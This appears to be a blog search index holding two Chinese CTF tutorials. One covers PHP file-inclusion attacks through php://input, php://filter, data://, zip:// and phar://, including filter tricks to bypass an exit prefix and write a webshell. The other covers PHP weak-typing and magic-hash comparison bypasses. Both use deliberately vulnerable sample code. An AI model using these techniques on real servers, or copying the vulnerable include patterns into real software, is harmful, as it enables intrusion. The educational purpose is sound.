<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[文件包含漏洞--常见封装协议的利用]]></title>
      <url>/2017/09/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E--%E5%B8%B8%E8%A7%81%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="文件包含漏洞–常见封装协议的利用"><a href="#文件包含漏洞–常见封装协议的利用" class="headerlink" title="文件包含漏洞–常见封装协议的利用"></a>文件包含漏洞–常见封装协议的利用</h1><h3 id="0x01-php流input-allow-url-include-On"><a href="#0x01-php流input-allow-url-include-On" class="headerlink" title="0x01 php流input(allow_url_include=On)"></a>0x01 php流input(allow_url_include=On)</h3><p><code>php://input</code>是一个只读信息流，当在POST请求(通常只针对POST，而不是其他的请求)下，且 <code>enctype</code> 不等于<code>&quot;multipart/form-data&quot;</code>时，使用<code>php://input</code>代替<code>$HTTP_RAW_POST_DATA</code>，因为<code>php://input</code>可以不依赖于特定的<code>php.ini</code>指令</p>
<p>form表单中的enctype属性指定将数据发回到服务器时浏览器使用的编码类型。enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<p>php://input如果要使用，需要 <code>allow_url_include=On</code> </p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">include</span>($_GET[<span class="string">'f'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE1.png" alt=""></p>
<h3 id="0x02-php流filter"><a href="#0x02-php流filter" class="headerlink" title="0x02 php流filter"></a>0x02 php流filter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</div></pre></td></tr></table></figure>
<p>这句话的大体意思是：数据流在读取或写入资源之前会进行用户事先安排好的一些过滤操作，如对数据流进行base64编码或解码操作，对数据流进行rot13编码操作或去除HTML标签操作等。</p>
<p>但是php://filter存在文件包含漏洞，可以用来读取服务器上的文件内容，而且不需要开启allow_url_include，基本的读取文件格式如下：</p>
<p>php://filter/read=convert.base64-encode/resource=[文件路径]</p>
<p>这句话的意思是：将想要读取的文件经过base64加密读取出来</p>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">include</span>($_GET[<span class="string">'f'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>还是相同的一个PHP文件，但是使用php://filter来实现读取文件，下面是我们需要读取的文件，名为<code>phpfilter.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> 	<span class="keyword">echo</span> <span class="string">"php://filter"</span>;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE4.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE5.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE6.png" alt=""></p>
<p>是不是和代码一致？这样就通过php://filter读取了文件</p>
<p>下图是自己总结的关于php://filter的更具体的用法示意图，可以利用php://filter数据流绕过<code>死亡exit</code>，进而将webshell直接传到目标服务器上</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE3.png" alt=""></p>
<p>将举几个例子来讲解</p>
<p>实例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</div><div class="line">    $content .= $_POST[<span class="string">'txt'</span>];</div><div class="line">    file_put_contents($_POST[<span class="string">'filename'</span>], $content);</div></pre></td></tr></table></figure>
<p>1.利用base64解码过滤器去除<code>死亡exit</code></p>
<p>通过分析代码可知，在我们以POST方式上传<code>txt</code>之前，变量<code>$content</code>的前面会被加上<code>&lt;?php exit; ?&gt;</code>，这样就导致即使上传了webshell也无法成功的执行(实战中经常遇到)，但是我们发现<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，于是就想到可以使用<code>php://filter</code>流进行绕过</p>
<p>那么具体怎么绕过呢？这里就需要用到<code>php://filter</code>流中的<code>base64-decode</code>方法了。</p>
<pre><code>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
</code></pre><p>这句话就是关键，base64解码时会将不在64个可打印字符中的符号去掉，<code>&lt;?php exit; ?&gt;</code>中<code>&lt;</code>、<code>&gt;</code>、<code>?</code>、<code>;</code>几个符号均不在base64解码可打印的符号中，所以在解码的过程中会被去掉，这样一来经过<code>base64-decode</code>方法后<code>&lt;?php exit; ?&gt;</code>会变成<code>phpexit</code>总共七个字符，又因为base64算法解码时4个<code>byte</code>为一组，所以需要给<code>phpexit</code>加上一个字符，凑够8个字符，组成一个<code>byte</code>。</p>
<pre><code>需要注意的是如果以后需要使用这个方法进行绕过时，可能经过base64解码后的字符串有可能不是8的倍数，将字符串凑成8的倍数才能实现绕过
</code></pre><p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE12.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE13.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE14.png" alt=""></p>
<p>2.利用<code>strip_tags函数</code> + <code>base64-decode</code>方法去除<code>死亡exit</code></p>
<pre><code>strip_tags函数：剥去字符串中的HTML标签
</code></pre><p><code>php://filter</code>数据流支持使用这个方法，同时也支持多种方法同时使用，这样的话就可以利用这两种方法的组合去除<code>死亡exit</code>并实现webshell的写入，具体方法如下：</p>
<p><code>&lt;?php exit; ?&gt;</code>在被<code>strip_tags</code>方法处理后会被去掉，但是如果我们要写入对方服务器的webshell文件的内容也是采用明文的话，同样也会被<code>strip_tags</code>方法去除掉，所以需要对写入对方服务器的webshell文件的内容进行base64编码，这样的话，写入对方服务器的webshell文件的内容就不存在HTML标签，也就不会被<code>strip_tags</code>方法处理，之后<code>php://filter</code>中使用<code>base64-decode</code>方法对其进行解码，成功的写入</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE15.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE16.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE17.png" alt=""></p>
<p>3.利用rot13编码去除<code>死亡exit</code></p>
<pre><code>ROT13（回转13位，rotateby13places，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。ROT13是它自己本身的逆反；也就是说，要还原ROT13，套用加密同样的算法即可得，故同样的操作可用再加密与解密。
</code></pre><p>值得注意的是<code>ROT13是它自己本身的逆反还原ROT13，套用加密同样的算法即可得，故同样的操作可用再加密与解密。</code>，利用这个原理，可以先对我们要写入对方服务器的webshell文件的内容进行rot13编码，这样的话<code>&lt;?php exit; ?&gt;</code>在进行rot13解码时将会被解码成rot13编码的形式，这样的代码，PHP将无法识别，所以可以绕过<code>死亡exit</code></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE18.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE19.png" alt=""></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE20.png" alt=""></p>
<h3 id="0x03-data-URLs-allow-url-include-On"><a href="#0x03-data-URLs-allow-url-include-On" class="headerlink" title="0x03 data URLs(allow_url_include=On)"></a>0x03 data URLs(allow_url_include=On)</h3><p>php 的 data:// 是一个数据流封装器，基本用法如下：</p>
<pre><code>data://text/plain;base64,
</code></pre><p>其中<code>data://</code>为协议名，<code>text/plain</code>是需要封装的数据的格式，也可以封装图片文件；之后的<code>base64</code>是数据需要被进行base64编码；再之后就是需要封装的数据了。</p>
<p>可以利用这个协议的漏洞将文件包含漏洞变成代码执行漏洞，下面举实例演示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">include</span>($_GET[<span class="string">'f'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE7.png" alt=""></p>
<p>通过将<code>&lt;?php echo &quot;data://text/plain;base64&quot; ?&gt;</code> 这句代码进行base64编码过后，利用<code>data://text/plain;base64,代码</code>就可以执行该代码。</p>
<p>值得注意的是<code>&lt;?php echo &quot;data://text/plain;base64&quot; ?&gt;</code>这句代码<code>?&gt;</code>前加了一个空格，如果没有这个空格，命令将无法执行，如果怕忘记这个规则，可以直接不加<code>?&gt;</code>，代码也可以执行</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE8.png" alt=""></p>
<h3 id="0x04-zip协议"><a href="#0x04-zip协议" class="headerlink" title="0x04 zip协议"></a>0x04 zip协议</h3><p>可以利用zip协议来读取文件，zip协议的格式是：</p>
<pre><code>zip://zip文件目录/xxx.zip%23xxx.zip中的文件
</code></pre><p>这个协议的文件读取漏洞可以结合文件上传漏洞，先上传一个xxx.zip文件，这个压缩文件中包含我们想要读取的文件(比如webshell文件)</p>
<p>需要注意的是URL编码，也就是zip协议格式中的<code>%23(#)</code>，<code>#</code>会与URL协议中的<code>#</code>冲突，所以在使用zip协议的时候需要把<code>#</code>转换成<code>%23</code></p>
<p>还有一点就是可以把<code>.zip</code>后缀改成<code>.jpg</code>后缀，这样也可以成功，这个技巧有时可以绕过上传的限制，格式为：</p>
<pre><code>zip://zip文件目录/xxx.jpg%23xxx.zip中的文件
</code></pre><p>下面是实例：</p>
<p>phpzip.php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>    <span class="keyword">include</span>(<span class="string">'funct.php'</span>);    $file = $_GET[<span class="string">'file'</span>];    $ext = get_extension($file);    $bz = check_extension($ext);    <span class="keyword">if</span>($bz)&#123;        <span class="keyword">include</span>($file);    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">include</span>($file . <span class="string">'.php'</span>);    &#125;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>funct.php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>    <span class="function"><span class="keyword">function</span> <span class="title">get_extension</span><span class="params">($f)</span></span>&#123;        <span class="keyword">return</span> pathinfo($f, PATHINFO_EXTENSION);    &#125;     <span class="function"><span class="keyword">function</span> <span class="title">check_extension</span><span class="params">($f)</span></span>&#123;        <span class="keyword">if</span>($f == <span class="string">'php'</span>)&#123;            <span class="keyword">return</span> <span class="keyword">true</span>;        &#125;<span class="keyword">else</span>&#123;            <span class="keyword">return</span> <span class="keyword">false</span>;        &#125;    &#125;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>创建一个php文件，如<code>1.php</code>，之后对<code>1.php</code>进行压缩，压缩为<code>1.zip</code></p>
<p>1.php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>	<span class="keyword">echo</span> <span class="string">"zip:// zipd'sir/xxx.zip%23xxx.zip'sfile"</span>;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE9.png" alt=""></p>
<p>.jpg形式：</p>
<p><img src="media/15060753773903/15062756750310.jpg" alt=""></p>
<h3 id="0x05-phar协议"><a href="#0x05-phar协议" class="headerlink" title="0x05 phar协议"></a>0x05 phar协议</h3><p>phar协议的作用是将php文件归档到一个文件包中，功能与zip协议类似。</p>
<p>若要使用此协议，PHP版本要大于5.3.0</p>
<p>创建phar归档文件包时，需要注意的是<code>php.ini</code>文件的<code>phar.readonly</code>参数要设置成Off(<code>php.ini</code>文件里有两个都需要设置成Off)</p>
<p>实例：</p>
<p>1.利用脚本生成phar归档文件包</p>
<p>phar.php源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>	$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/pharphar.aaa'</span>, <span class="number">0</span>,<span class="string">'pharphar'</span>,Phar::ZIP) ; 	$p-&gt;addFromString(<span class="string">'phar.txt'</span>, <span class="string">'&lt;?php echo dirname(__FILE__);?&gt;'</span>); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE21.png" alt=""></p>
<p>也可以自己生成，即新建一个<code>phar.txt</code>文件，文件中写入需要执行的php代码，之后进行zip压缩，之后可以任意的修改后缀名，也可以生成一个归档文件包。</p>
<p>生成文件包的工作在本地完成，之后将归档文件包上传到目标机，之后利用phar协议执行归档文件包中的txt文件(以php文件的格式执行)</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh13%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8D%8F%E8%AE%AE11.png" alt=""></p>
<p>参考文章：<br><a href="http://www.cnblogs.com/qing123/p/4513870.html" target="_blank" rel="external">php://input,php://filter,data URI schema的那些事</a><br><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=16207" target="_blank" rel="external">一道ctf场景还原&amp;&amp;防御攻破</a><br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="external">谈一谈php://filter的妙用</a></p>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP弱类型]]></title>
      <url>/2017/09/19/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      <content type="html"><![CDATA[<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h3 id="0x01-PHP弱类型的介绍"><a href="#0x01-PHP弱类型的介绍" class="headerlink" title="0x01 PHP弱类型的介绍"></a>0x01 PHP弱类型的介绍</h3><p>弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。</p>
<p>类型转换是无法避免的，当不同类型的变量进行比较，或者接受参数，又或者两个变量类型不匹配的情况下，PHP都会自动进行类型转换，但正是由于PHP这种弱类型语言的特性，导致在类型转换的时候会出现各种各样的为题。</p>
<h3 id="0x02-弱类型中的类型转换"><a href="#0x02-弱类型中的类型转换" class="headerlink" title="0x02 弱类型中的类型转换"></a>0x02 弱类型中的类型转换</h3><p>1.<code>字符串</code>转换为<code>数值</code>时的数值类型问题：</p>
<p>当一个<code>字符串</code>被认定为<code>数值</code>时，如果<code>字符串</code>没有包含“.”，“e”，“E”时，而且被转换成的<code>数值</code>的值再整数范围内，则<code>字符串</code>转换为<code>数值</code>时的<code>数值</code>类型为<code>int</code>类型，其余的情况下为<code>float</code>类型</p>
<p>2.字符串类型和数值类型进行运算和比较时(+、-、*、/、==)，字符串类型会被转换成数值类型进行比较(类型转换的问题)，例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$zzh=<span class="number">1</span> + <span class="string">"10.5"</span>; <span class="comment">// $zzh=11.5(float)</span></div><div class="line">	$zzh=<span class="number">1</span>+<span class="string">"-1.3e3"</span>; <span class="comment">//$zzh=-1299(float)</span></div><div class="line">	$zzh=<span class="number">1</span>+<span class="string">"bob-1.3e3"</span>;<span class="comment">//$zzh=1(int)</span></div><div class="line">	$zzh=<span class="number">1</span>+<span class="string">"2admin"</span>;<span class="comment">//$zzh=3(int)</span></div><div class="line">	$zzh=<span class="number">1</span>+<span class="string">"admin2"</span>;<span class="comment">//$zzh=1(int)</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>3.<code>字符串</code>类型转换成<code>数值</code>类型的原则：</p>
<p>(1)普通字符串的数值由其开始部分决定，如果字符串开始部分是合法的数值，则字符串的数值为其开始部分的值，否则为0。(也可以理解为从字符串的头开始寻找第一个不是数字的字符，该字符前面的数值即该字符串的数值，如果没有找到即开头就是字符，则该字符串的数值为0)，例：</p>
<pre><code>&quot;1yzc&quot; == 1 //true
&quot;yzc&quot; == 0  //true
&quot;0yzc&quot; == 0 //true
&quot;yzc1&quot; == 1 //false
&quot;yzc1&quot; == 0 //false
</code></pre><p>(2)0e\d+类型的字符串(例：0e123456)会被解析为科学计数法，在比较时，这样的字符串都是相等的，因为被认定为科学计数法进行比较，0无论进行了多少次方结果还是0，所以<code>0e\d+``字符串</code>比较时都是相等的，例</p>
<pre><code>&quot;0e1234&quot; == &quot;0e5678&quot; //true
&quot;0e1234&quot; == &quot;0eabc&quot;  //false
&quot;0e1234&quot; == &quot;0&quot; //true
&quot;0e1234&quot; == 0   //true
</code></pre><p>(3)0x(十六进制的转换)开头的字符串会被解析成十进制再进行比较，所以0x开头的字符串与其十进制的字符串或者数值都是相等的，例：</p>
<pre><code>&quot;0x1e240&quot; == &quot;123456&quot; //true
&quot;0x1e240&quot; == 123456   //true
&quot;0x1e240&quot; == &quot;1x1e240&quot;//false
</code></pre><p>4.一些其他的类型转换：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$yzc=<span class="keyword">null</span>;</div><div class="line">$zzh=<span class="keyword">false</span>;</div><div class="line">$yzc == $zzh; <span class="comment">//true</span></div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$yzc=<span class="string">''</span>;</div><div class="line">$zzh=<span class="keyword">null</span>;</div><div class="line">$yzc == $zzh; <span class="comment">//true</span></div></pre></td></tr></table></figure>
<h3 id="0x03-内置函数的参数松散性"><a href="#0x03-内置函数的参数松散性" class="headerlink" title="0x03 内置函数的参数松散性"></a>0x03 内置函数的参数松散性</h3><p>1.定义：在调用函数时，给函数传递一个函数无法接受的参数类型</p>
<p>2.出现参数松散性的函数：</p>
<p>(1)md5()函数：</p>
<p>PHP手册中的md5()函数的描述是<code>string md5 ( string $str [, bool $raw_output = false ] )</code>，md5函数定义中，函数接受的参数为字符串类型，那么如果传入的参数不是一个字符串而是一个数组的话，md5函数不会报错，只是无法计算出正确的结果，这样的话只要把数组传入md5()函数，计算出的结果都相等</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">	$yzc = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</div><div class="line">	$zzh = <span class="keyword">array</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);</div><div class="line"></div><div class="line">	var_dump(md5($yzc) == md5($zzh));</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh12php%E5%BC%B1%E7%B1%BB%E5%9E%8B1.png" alt=""></p>
<p>可以看到md5()函数接受了非字符串类型的参数，但依旧进行了计算</p>
<p>(2)strcmp()函数(php的版本的小于5.3):</p>
<p>PHP手册中strcmp()函数的描述是：<code>int strcmp ( string $str1 , string $str2 )</code> ，从该函数的定义可以看出需要向strcmp()函数传递两个字符串类型的变量。</p>
<p>strcmp()函数的功能是比较两个字符串，本质是将两个字符串转换成ACIll值，然后根据计算结果返回值，如果 <code>$str1</code> 小于 <code>$str2</code> 返回-1；如果相等，返回0；否则返回1</p>
<p>那么如果传入一个strcmp()函数无法接受的参数，比如数组，参数的类型不符合函数定义的类型，所以一旦传入，函数将发生错误，返回null。null 在前文讲过和 false 相等，就可以在比较中被认为是0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">	$yzc = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</div><div class="line"></div><div class="line">	var_dump($yzc,<span class="string">'123'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh12php%E5%BC%B1%E7%B1%BB%E5%9E%8B2.png" alt=""></p>
<p>(3)switch()函数:</p>
<p>switch()函数如果为数字型case判断时，会将传入switch()函数的参数转换为int类型再进行case判断</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">	$yzc =<span class="string">"2zzh"</span>;</div><div class="line">	<span class="keyword">switch</span> ($yzc) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">	<span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">	<span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">	 <span class="keyword">echo</span> <span class="string">"yzc is less than 3 but not negative"</span>;</div><div class="line">	 <span class="keyword">break</span>;</div><div class="line">	<span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">	 <span class="keyword">echo</span> <span class="string">"yzc is 3"</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh12php%E5%BC%B1%E7%B1%BB%E5%9E%8B3.png" alt=""></p>
<p>(4)in_array()函数和array_search()函数</p>
<p>PHP手册中in_array()函数的描述：<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p>
<p>PHP手册中array_search()函数的描述：<code>mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )</code></p>
<p>以上两个函数的作用都是判断 <code>$needle</code> 变量是否存在于 <code>$haystack</code> 变量中，这两个函数还设置了一个 <code>$strict</code> 变量，默认值为 false ，如果值为true，会对两个变量的类型进行判断。</p>
<p>在这两个函数中，进行查询也可以理解为判断 <code>$needle</code> == <code>$haystack</code>，这样的话如果<code>$needle</code>和<code>$haystack</code>分别是字符串类型和数值类型，就有可能使函数返回相等的显示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$array=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">'3'</span>];</div><div class="line">	var_dump(in_array(<span class="string">'abc'</span>, $array)); <span class="comment">//true</span></div><div class="line">	var_dump(in_array(<span class="string">'1bc'</span>, $array)); <span class="comment">//true</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>字符串<code>&#39;abc&#39;</code>在比较时转换成了0，所以<code>&#39;abc&#39;</code>存在于<code>$array</code>中<br>字符串<code>&#39;1abc&#39;</code>在比较时转换成了1，所以<code>&#39;1abc&#39;</code>存在于<code>$array</code>中</p>
<h3 id="0x04-实战中需要注意的地方："><a href="#0x04-实战中需要注意的地方：" class="headerlink" title="0x04 实战中需要注意的地方："></a>0x04 实战中需要注意的地方：</h3><p>1.md5()函数会产生<code>0e\d+</code>结构的字符串，前文说过<code>0e\d+</code>结构的字符串使用 <code>==</code> 比较都是相等的；但是如果使用 <code>===</code> 进行比较的话<code>0e\d+</code>结构的字符串是不相等的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>	$flag = <span class="string">"This is flag!"</span>;	<span class="keyword">echo</span> var_dump(md5($_GET[<span class="string">'a'</span>])).<span class="string">'&lt;br&gt;'</span>;	<span class="keyword">echo</span> var_dump(md5($_GET[<span class="string">'b'</span>])).<span class="string">'&lt;br&gt;'</span>;	<span class="keyword">echo</span> var_dump(md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>])).<span class="string">'&lt;br&gt;'</span>; <span class="comment">//true</span>	<span class="keyword">echo</span> var_dump(md5($_GET[<span class="string">'a'</span>]) === <span class="string">'0'</span>).<span class="string">'&lt;br&gt;'</span>; <span class="comment">//false</span>	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;		<span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])&#123;			<span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>])) <span class="comment">//这里需要注意，是`===`而不是`==`</span>				<span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);			<span class="keyword">else</span>				<span class="keyword">print</span> <span class="string">'Wrong.&lt;br&gt;'</span>;		&#125;	&#125;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><code>$_GET[&#39;a&#39;]=QNKCDZO</code>&amp;<code>$_GET[&#39;b&#39;]=s214587387a</code>，这两个变量经过md5后都是<code>0e\d+</code>形式的字符串，我们构造的URL为：<code>http://ip/ceshi2.php?a=QNKCDZO&amp;b=s214587387a</code>，输出结果如下图，最后的回显是<code>Wrong</code>说明<code>md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])</code>这条语句并不成立，两个变量的经过md5函数后并不<code>===</code>，我个人觉得原因在于<code>===</code>比较时，除了值要相等以外，类型也要相等。在比较时先确定了两个变量的类型，均为字符串类型，当类型确定下之后比较值的时候就是比较这两个字符串是否相同，图中的结果显示是不相同的。</p>
<p>但是如果是<code>md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;])</code>这样的比较，那么就相等，因为在不比较类型的情况下，<code>0e\d+</code>字符串会被解析为科学计数法，从而导致连个变量相等。</p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh12php%E5%BC%B1%E7%B1%BB%E5%9E%8B4.png" alt=""></p>
